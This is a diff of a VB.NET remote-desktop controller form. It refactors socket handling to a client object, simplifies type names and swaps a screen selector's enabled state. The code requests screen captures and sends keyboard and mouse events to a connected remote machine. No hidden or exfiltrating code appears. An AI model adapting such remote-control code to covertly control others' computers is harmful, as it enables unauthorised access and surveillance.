@@ -3,7 +3,7 @@ Imports System.Runtime.InteropServices
 Imports System.Timers
 
 Public Class Remote
-    Public Sock As Integer
+    Public cli As Client
     Public Sz As Size
     Public F As Main
     ''' <summary>
@@ -43,7 +43,7 @@ Public Class Remote
     ''' Current screen data
     ''' </summary>
     Public cscreen As Byte()
-    Private Sub Remote_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+    Private Sub Remote_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
 
         For i As Integer = 0 To 13
             C1.Items.Add(QZ(i))
@@ -81,7 +81,7 @@ Public Class Remote
     Public Sub PktToImage(ByVal BY As Byte())
         cscreen = BY
         If active Then
-            F.S.Send(Sock, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
+            F.S.Send(cli, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
         End If
         Dim B As Array = fx(BY, "^&^")
         Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
@@ -125,12 +125,12 @@ Public Class Remote
         P1.Image = K
     End Sub
 
-    Private Sub mTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)
+    Private Sub mTimer_Tick(ByVal sender As Object, ByVal e As ElapsedEventArgs)
         MouseLabel.Image = My.Resources.mouse
         mTimer.Stop()
     End Sub
 
-    Private Sub kTimer_Tick(ByVal sender As System.Object, ByVal e As ElapsedEventArgs)
+    Private Sub kTimer_Tick(ByVal sender As Object, ByVal e As ElapsedEventArgs)
         KeyboardLabel.Image = My.Resources.keyboard
         kTimer.Stop()
     End Sub
@@ -210,7 +210,7 @@ Public Class Remote
             P1.Focus()
             chI(KeyboardLabel, My.Resources.keyboard__arrow, kTimer)
             key = e.KeyCode
-            F.S.Send(Sock, Main.n.keyboard & Main.Sep & key & Main.Sep & 0)
+            F.S.Send(cli, Main.n.keyboard & Main.Sep & key & Main.Sep & 0)
         End If
     End Sub
 
@@ -220,53 +220,54 @@ Public Class Remote
             P1.Focus()
             chI(KeyboardLabel, My.Resources.keyboard__arrow, kTimer)
             key = e.KeyCode
-            F.S.Send(Sock, Main.n.keyboard & Main.Sep & key & Main.Sep & KEYEVENTF_KEYUP)
+            F.S.Send(cli, Main.n.keyboard & Main.Sep & key & Main.Sep & KEYEVENTF_KEYUP)
         End If
     End Sub
 
-    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseDown
+    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles P1.MouseDown
         If MouseCheckBox.Checked = True Then
             ''todo: implememtn mouse wheel
             Dim PP = New Point(mousePos.X, mousePos.Y)
             Dim but As Integer
-            If e.Button = Windows.Forms.MouseButtons.Left Then
+
+            If e.Button = MouseButtons.Left Then
                 but = 2
                 chI(MouseLabel, My.Resources.mouse_select, mTimer)
             End If
-            If e.Button = Windows.Forms.MouseButtons.Middle Then
+            If e.Button = MouseButtons.Middle Then
                 but = 20
                 chI(MouseLabel, My.Resources.mouse_select_wheel, mTimer)
             End If
-            If e.Button = Windows.Forms.MouseButtons.Right Then
+            If e.Button = MouseButtons.Right Then
                 but = 8
                 chI(MouseLabel, My.Resources.mouse_select_right, mTimer)
             End If
-            F.S.Send(Sock, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
+            F.S.Send(cli, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
         End If
     End Sub
-    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseUp
+    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles P1.MouseUp
         If MouseCheckBox.Checked = True Then
             Dim PP = New Point(mousePos.X, mousePos.Y)
             Dim but As Integer
-            If e.Button = Windows.Forms.MouseButtons.Left Then
+            If e.Button = MouseButtons.Left Then
                 but = 4
                 chI(MouseLabel, My.Resources.mouse_select, mTimer)
             End If
-            If e.Button = Windows.Forms.MouseButtons.Middle Then
+            If e.Button = MouseButtons.Middle Then
                 but = 40
                 chI(MouseLabel, My.Resources.mouse_select_wheel, mTimer)
             End If
-            If e.Button = Windows.Forms.MouseButtons.Right Then
+            If e.Button = MouseButtons.Right Then
                 but = 16
                 chI(MouseLabel, My.Resources.mouse_select_right, mTimer)
             End If
-            F.S.Send(Sock, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
+            F.S.Send(cli, Main.n.mouseclick & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep & but)
         End If
 
     End Sub
     Dim op As New Point
     Dim pp As New Point
-    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles P1.MouseMove
+    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles P1.MouseMove
         Try
             srcImage = Me.P1.Image.Clone
         Catch ex As Exception
@@ -298,21 +299,21 @@ Public Class Remote
                 If PP <> op Then
                     op = PP
                     chI(MouseLabel, My.Resources.mouse__arrow, mTimer)
-                    F.S.Send(Sock, Main.n.mousemove & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep)
+                    F.S.Send(cli, Main.n.mousemove & Main.Sep & PP.X & Main.Sep & PP.Y & Main.Sep)
                 End If
             End If
         End If
     End Sub
-    Private Sub ToggleButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToggleButton.Click
+    Private Sub ToggleButton_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToggleButton.Click
         If active = False Then
             P1.Focus()
-            M.Enabled = True
+            M.Enabled = False
             active = True
             InfoStrip.Visible = True
             ToggleButton.Text = "Stop"
-            F.S.Send(Sock, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
+            F.S.Send(cli, Main.n.getscreen & Main.Sep & C1.SelectedIndex & Main.Sep & C2.Text & Main.Sep & C.Value)
         Else
-            M.Enabled = False
+            M.Enabled = True
             active = False
             InfoStrip.Visible = False
             ToggleButton.Text = "Start"
@@ -326,11 +327,11 @@ Public Class Remote
     End Sub
 
     Sub clear()
-        F.S.Send(Sock, Main.n.clearscreen)
+        F.S.Send(cli, Main.n.clearscreen)
     End Sub
 
     Private Sub M_SelectedIndexChanged(sender As Object, e As EventArgs) Handles M.SelectedIndexChanged
-        F.S.Send(Sock, Main.n.changescreen & Main.Sep & M.SelectedIndex)
+        F.S.Send(cli, Main.n.changescreen & Main.Sep & M.SelectedIndex)
     End Sub
 
     Private Sub P1_Resize(sender As Object, e As EventArgs) Handles P1.Resize
